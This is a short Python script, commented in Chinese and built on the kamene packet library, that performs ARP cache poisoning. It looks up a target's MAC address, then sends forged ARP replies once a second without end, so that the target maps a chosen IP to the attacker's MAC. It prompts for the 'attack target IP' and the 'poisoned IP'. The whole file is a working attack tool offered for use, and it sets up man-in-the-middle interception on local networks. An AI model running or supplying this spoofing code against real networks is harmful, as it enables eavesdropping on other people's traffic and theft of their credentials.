from kamene.all import *
from Network.Tools.GET_IP import get_ip_address
from Network.Tools.GET_MAC import get_mac_address #导入获取本机MAC地址方法
import time

global localip, localmac, ip_1_mac, ip_2_mac, g_ip_1, g_ip_2, g_ifname

def get_arp(ip_address, ifname):
    '''
      获取IP地址对应的MAC地址
    '''
    #获取本机IP地址
    localip = get_ip_address(ifname)
    #获取本机MAC地址
    localmac = get_mac_address(ifname)
    pkt=Ether(src=localmac, dst='FF:FF:FF:FF:FF:FF')/ARP(op=1, hwsrc=localmac, hwdst='00:00:00:00:00:00', psrc=localip, pdst=ip_address)
    #发送ARP请求并等待响应,超时时间：timeout=1
    result_raw = srp(pkt, timeout=1,iface = ifname, verbose = False)
    #把响应的数据包对，产生为清单
    result_list = result_raw[0].res
    #[0]第一组响应数据包
    #[1]接受到的包，[0]为发送的数据包
    #[1]ARP头部字段中的['hwsrc']字段，作为返回值返回
    mac=str(result_list[0][1].getlayer(ARP).fields['hwsrc'])
    return mac
def arp_spoof(ip_1, ip_2, ifname):
    '''
     用本机的MAC去替换被攻击主机arp表中被毒化IP的MAC
    '''
    #global localip,localmac,ip_1_mac,ip_2_mac,g_ip_1,g_ip_2,g_ifname #申明全局变量
    g_ip_1 = ip_1 #为全局变量赋值，g_ip_1为被毒化ARP设备的IP地址
    g_ip_2 = ip_2 #为全局变量赋值，g_ip_2为本机伪装设备的IP地址
    g_ifname = ifname #为全局变量赋值，攻击使用的接口名字
    #获取本机IP地址，并且赋值到全局变量localip
    localip = get_ip_address(ifname)
    #获取本机MAC地址，并且赋值到全局变量localmac
    localmac = get_mac_address(ifname)
    #获取ip_1的真实MAC地址
    ip_1_mac = get_arp(ip_1,ifname)
    while True:#一直攻击，直到ctl+c出现！！！
        #op=2,响应ARP
        pkt=Ether(src=localmac, dst=ip_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1)
        # sendp(pkt)方式，根据二层发包，但不接收响应包
        sendp(pkt, iface = g_ifname, verbose = False)
        print("发送ARP欺骗数据包！欺骗" + ip_1 + '本地MAC地址为' + ip_2 + '的MAC地址！！！')
        time.sleep(1)

if __name__ == "__main__":
    ip1=input("攻击目标IP>>>")
    ifname=input("接口名称>>>")
    ip2=input("毒化的IP>>>")
    arp_spoof(ip1, ip2, ifname)